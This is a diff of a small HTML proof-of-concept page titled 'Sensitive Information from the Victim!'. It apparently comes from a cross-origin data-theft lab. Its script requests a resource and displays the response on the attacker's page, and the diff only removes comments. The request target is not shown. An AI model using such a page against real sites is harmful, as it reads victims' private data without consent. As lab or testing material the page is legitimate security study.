@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>Sensitive Information from the Victim!</h1>
-    <p id="responseText"></p> <!-- Add a paragraph tag with an id -->
+    <p id="responseText"></p> 
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
@@ -16,10 +16,9 @@
         req.send();
 
         function reqListener() {
-            var responseText = this.responseText; // Store the response text in a variable
-            document.getElementById('responseText').textContent = responseText; // Set the text content of the paragraph tag
-            // Remove the line below to stop the continuous reloading
-            // location='/satz.html'; // Navigate to the specified page
+            var responseText = this.responseText; 
+            document.getElementById('responseText').textContent = responseText;
+            
         };
     </script>
 </body>
